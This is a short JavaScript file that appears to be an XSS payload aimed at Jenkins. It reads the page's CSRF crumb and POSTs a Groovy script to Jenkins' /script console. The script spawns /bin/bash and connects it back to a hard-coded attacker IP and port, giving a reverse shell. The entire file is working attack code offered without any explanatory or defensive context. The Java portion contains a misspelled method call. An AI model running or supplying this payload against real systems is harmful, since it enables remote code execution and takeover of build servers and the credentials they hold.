let attackers_ip = "192.168.152.131";
let attackers_port = "5555";

let reverse_payload = "String host=\"" + attackers_ip + "\";"
reverse_payload = reverse_payload.concat("int port=" + attackers_port + ";");
reverse_payload = reverse_payload.concat("String bash=\"/bin/bash\";");
reverse_payload = reverse_payload.concat("Process p = new ProcessBuilder(bash).redirectErrorStream(true).start(); Socket s = new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destory();s.close();")

let crumb_name = document.head.getAttribute("data-crumb-header");
let crumb_value = document.head.getAttribute("data-crumb-value");

let body_val="script="+reverse_payload+'&'+crumb_name+'='+crumb_value+"&Submit=";
let jenkins_url = window.location.origin + '/script';

fetch(jenkins_url,{
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: body_val
})
